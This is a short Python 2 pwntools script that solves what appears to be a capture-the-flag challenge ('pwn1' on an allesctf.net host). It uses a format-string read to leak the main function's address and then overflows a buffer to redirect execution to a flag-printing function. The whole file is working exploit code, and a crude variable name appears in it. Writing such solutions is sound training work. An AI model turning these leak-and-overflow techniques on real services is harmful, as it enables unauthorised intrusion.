from pwn import *



def leak_main(r):
	offset = 0x108
	r.recvuntil("name:\n")
	r.sendline("%47$llx")
	print r.recvline()
	print r.recvline()
	print r.recvline()
	addr_main = int(r.recvline()[:12],16)
	addr_flag = addr_main - offset
	print "addr of main: " + hex(addr_main)
	print "addr of flag: " + hex(addr_flag)
	return addr_flag


def exploit(e):
	print "started exploit"
	addr = leak_main(e)
	piece_of_fakin_shit = p64(addr + 0x36)
	payload = ""
	payload += "Expelliarmus\x00"
	payload += "A" * 251
	payload += piece_of_fakin_shit
	payload += p64(addr)
	e.sendline(payload)

	p.interactive()

if __name__ == "__main__":
	#p = gdb.debug("./pwn1")
	p = remote('hax1.allesctf.net',9100)
	exploit(p)
	




